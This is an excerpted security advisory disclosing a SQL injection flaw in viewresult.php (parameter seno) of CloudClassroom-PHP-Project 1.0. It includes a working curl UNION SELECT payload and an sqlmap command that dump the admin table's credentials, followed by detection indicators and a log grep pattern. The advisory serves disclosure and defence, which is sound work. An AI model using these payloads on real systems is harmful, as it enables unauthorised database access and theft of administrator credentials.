# Security Advisory — SQL Injection in viewresult.php (parameter seno)

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-31**
...
A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **viewresult.php**, that allows **an attacker (None (via Broken Access Control — item 00; design would require student session); user interaction: None)** to exploit a **SQL Injection (UNION-based / error-based)** flaw.

Parameter `seno` is interpolated in quotes in SELECT query. Closing the quote allows `UNION SELECT`. Target table exposes 4 columns. Confirmed with unauthenticated admin credential dump.
...
| Component: viewresult.php | 1.0 | None | Affected |
...
The vulnerability occurs due to **SQL Injection (UNION-based / error-based)** in the component **viewresult.php**.
...
1. Request `viewresult.php` with `seno` containing UNION payload (no cookie — item 00).
...
4. Automate with sqlmap (`-p seno`) for full database dump.
...
<img width="1180" height="1042" alt="evidencia-web-31-viewresult-sqli" src="https://github.com/user-attachments/assets/2e63fc64-0bc8-419d-8a39-2f5665cce74f" />

**b) Vulnerable code line** (`viewresult.php`):

<img width="2360" height="800" alt="evidencia-codigo-31-viewresult-sqli" src="https://github.com/user-attachments/assets/9887082a-6f3c-405d-87d1-103bb2ea58ca" />
...
```bash
curl -s -G "http://192.168.95.131:9292/viewresult.php" \
  --data-urlencode "seno=' UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"\n\nsqlmap -u "http://192.168.95.131:9292/viewresult.php?seno=1" -p seno --batch --dump -T admin
```
...
3. Access the component **viewresult.php** (parameter(s): seno).
...
- Requests to `viewresult.php` with `UNION`, `SELECT`, `extractvalue`, `concat`, single quotes or `-- ` in parameter `seno`.
- Database error messages (e.g., `XPATH syntax error`, MariaDB/MySQL errors) reflected in responses.

### Example Log Search

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "viewresult.php"
```
